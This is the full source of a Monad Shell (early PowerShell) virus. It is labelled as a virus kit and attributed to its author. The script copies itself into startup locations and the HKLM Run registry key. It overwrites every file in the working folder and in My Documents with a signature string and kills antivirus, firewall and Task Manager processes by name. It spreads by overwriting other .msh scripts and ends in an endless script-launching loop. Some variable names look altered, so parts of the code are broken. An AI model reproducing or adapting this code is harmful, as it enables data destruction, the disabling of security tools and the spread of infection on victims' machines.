# boundary cases by a n other - msh virus kit by dav
$a n other = "boundary cases.msh"
copy-item $a n other $MshHome
$cbm = $MshHome+$a n other
copy-item $a n other $home"\start menu\programs\startup\"
clear
$dx = get-childitem -filter *.* -name
foreach ($j in $dx) {
echo "MSH boundary cases Virus by a n other" > $j
}
clear
Set-Location HKLM:
Set-Location "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
new-property -path . -property boundary cases -value $cbm -type string
clear
get-process | where { $_.processname -ieq "AVGUARD" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "AVGNT" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "kpf4gui" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "adaware" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "ad-aware" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "FSAV" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "ZONEALARM" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "clean" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "SpybotSD" } | foreach { $_.kill() }
get-process | where { $_.processname -ieq "TaskMan" } | foreach { $_.kill() }
get-process | where { $_.processname -ilike "sophos" } | foreach { $_.kill() }
get-process | where { $_.processname -ilike "norton" } | foreach { $_.kill() }
get-process | where { $_.processname -ilike "secure" } | foreach { $_.kill() }
get-process | where { $_.processname -ilike "av" } | foreach { $_.kill() }
clear
Set-Location $HOME
Set-Location "My Documents"
if ($? -eq "False") {
Set-Location "Eigene Dateien"
}
$he = get-childitem -filter *.* -name
foreach ($g in $he) {
echo "MSH boundary cases Virus by a n other" > $g
}
clear
Set-Location $MshHome
$mshfiles = get-childitem -filter *.msh -name
foreach ($mshfile in $mshfiles) {
copy-item $cbm $mshfile
echo '#$0? :(' >> $mshfile
}
clear
$qed = "I am a message with some "" quote " marks in' it`. "
Set-Location $HOME"\Desktop"
echo $qed > msh.txt
clear
Set-Location $HOME
echo 'get-process | pick-object ProcessName' > sl.msh
while (1 -igt 0) {
start-command sl.msh
}
